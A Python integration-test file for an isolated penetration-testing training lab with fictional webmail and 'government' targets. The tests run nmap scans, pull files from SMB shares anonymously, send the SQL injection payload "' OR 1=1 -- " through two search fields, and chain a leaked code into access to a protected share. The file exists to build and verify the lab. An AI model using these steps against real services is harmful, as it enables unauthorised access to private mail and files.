"""Colabまたは専用Linux環境で、本物のサービスとコマンドの連携を検証する。"""

import configparser
import json
import os
import sys
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

LAB_ROOT = os.environ.get("MIKURIYA_COLAB_INTEGRATION_ROOT")


@unittest.skipUnless(LAB_ROOT, "専用のLinux検証環境で実行する")
class ColabIntegrationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        sys.path.insert(0, LAB_ROOT)
        from colab_lab import Lab

        cls.lab = Lab(Path(LAB_ROOT))
        cls.lab.start()

    @classmethod
    def tearDownClass(cls) -> None:
        cls.lab.stop()

    def test_Nmapが実際のHTTPとSMBを識別する(self) -> None:
        from colab_lab import TARGET_HOST

        result = self.lab.run("nmap", "-sV", "-p", "80,445", "-oX", "-", TARGET_HOST)
        root = ET.fromstring(result.stdout)
        ports = {int(port.attrib["portid"]): port for port in root.findall(".//port")}
        for port in (80, 445):
            self.assertEqual(ports[port].find("state").attrib["state"], "open")
        self.assertEqual(ports[80].find("service").attrib["name"], "http")
        self.assertIn("Samba", ports[445].find("service").attrib.get("product", ""))

    def test_標的のWeb閲覧と認証付き共有が動作する(self) -> None:
        from colab_lab import TARGET_HOST

        result = self.lab.run(
            "curl",
            "--noproxy",
            "*",
            "-fsS",
            "-o",
            "/dev/null",
            "-w",
            "%{content_type}",
            f"http://{TARGET_HOST}/",
        )
        self.assertIn("text/html", result.stdout)
        account = json.loads((self.lab.root / "account.json").read_text())
        config = configparser.ConfigParser(interpolation=None)
        from colab_targets import SAMBA_SERVERS

        config.read(SAMBA_SERVERS[0].config_path(self.lab.root))
        share = next(section for section in config.sections() if section != "global")
        destination = f"//{TARGET_HOST}/{share}"
        import subprocess

        with self.assertRaises(subprocess.CalledProcessError):
            self.lab.run("smbclient", destination, "-N", "-c", "ls")
        shared = self.lab.run(
            "smbclient",
            destination,
            "-U",
            f"{account['username']}%{account['password']}",
            "-c",
            "ls",
        )
        self.assertTrue(shared.stdout.strip())

    def curl(self, *arguments: str) -> str:
        return self.lab.run("curl", "--noproxy", "*", "-fsS", *arguments).stdout

    def test_社内Webメールに正規ログインし検索の注入で範囲外のメールも読める(
        self,
    ) -> None:
        import importlib.util
        import tempfile
        from urllib.parse import quote

        spec = importlib.util.spec_from_file_location(
            "webmail_app", self.lab.root / "webmail/app.py"
        )
        webmail = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(webmail)
        # Webメールは、Sambaと共通の初期パスワードでログインする。
        account = json.loads((self.lab.root / "account.json").read_text())
        site = "http://mail.mikuriya-suisan.local"
        with tempfile.TemporaryDirectory() as temp:
            jar = str(Path(temp) / "cookies")
            mailbox = self.curl(
                "-c",
                jar,
                "-b",
                jar,
                "-L",
                "--data-urlencode",
                f"email={webmail.KANZAKI_EMAIL}",
                "--data-urlencode",
                f"password={account['password']}",
                f"{site}/login",
            )
            self.assertIn("/message?id=", mailbox)
            normal = self.curl("-b", jar, f"{site}/search?q=")
            injected = self.curl(
                "-b", jar, f"{site}/search?q={quote(chr(39) + ' OR 1=1 -- ')}"
            )
        # 検索結果は本文付きで1件ずつ並ぶ。注入すると本人以外のメールも混ざる。
        marker = 'class="search-result"'
        self.assertGreater(injected.count(marker), normal.count(marker))

    def test_政府サーバーは3つのサービスを公開し共有の範囲が寿司屋と分かれる(
        self,
    ) -> None:
        import subprocess

        result = self.lab.run(
            "nmap", "-sV", "-p", "80,445,8080", "-oX", "-", "kaiiki-hozen.local"
        )
        root = ET.fromstring(result.stdout)
        states = {
            int(port.attrib["portid"]): port.find("state").attrib["state"]
            for port in root.findall(".//port")
        }
        self.assertEqual(states, {80: "open", 445: "open", 8080: "open"})
        listed = self.lab.run("smbclient", "-L", "//kaiiki-hozen.local", "-N").stdout
        self.assertIn("handover", listed)
        self.assertIn("handoff", listed)
        self.assertNotIn("staff", listed)
        with self.assertRaises(subprocess.CalledProcessError):
            self.lab.run("smbclient", "//kaiiki-hozen.local/handoff", "-N", "-c", "ls")

    def test_匿名共有の閲覧コードで目録に入り検索の注入から保護共有へ進める(
        self,
    ) -> None:
        import re
        import tempfile
        from urllib.parse import quote

        from colab_targets import PORTAL_ACCOUNT

        with tempfile.TemporaryDirectory() as temp:
            listing = self.lab.run(
                "smbclient",
                "//kaiiki-hozen.local/handover",
                "-N",
                "-c",
                f"lcd {temp}; recurse; prompt; mget *",
            )
            self.assertEqual(listing.returncode, 0)
            texts = "".join(
                path.read_text(encoding="utf-8") for path in Path(temp).rglob("*.txt")
            )
            code = re.search(r"[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}", texts)[0]
            jar = str(Path(temp) / "cookies")
            catalog = "http://kaiiki-hozen.local:8080"
            self.curl(
                "-c", jar, "-b", jar, "-L", "-d", f"code={code}", f"{catalog}/login"
            )
            normal = self.curl("-b", jar, f"{catalog}/?keyword=")
            injected = self.curl(
                "-b", jar, f"{catalog}/?keyword={quote(chr(39) + ' OR 1=1 -- ')}"
            )
        self.assertGreater(injected.count("/documents/"), normal.count("/documents/"))
        username, password = PORTAL_ACCOUNT
        shared = self.lab.run(
            "smbclient",
            "//kaiiki-hozen.local/handoff",
            "-U",
            f"{username}%{password}",
            "-c",
            "ls",
        )
        self.assertTrue(shared.stdout.strip())

    def test_ネットワークが分離され外向きの経路を持たない(self) -> None:
        self.assertEqual(
            self.lab.run("ip", "route", "show", "default").stdout.strip(), ""
        )
        from colab_lab import active_worker

        pid = active_worker(self.lab.root)
        self.assertNotEqual(
            os.readlink("/proc/self/ns/net"), os.readlink(f"/proc/{pid}/ns/net")
        )
        previous = pid
        self.lab.start()
        self.assertNotEqual(active_worker(self.lab.root), previous)
        self.assertFalse(Path(f"/proc/{previous}").exists())


if __name__ == "__main__":
    unittest.main()
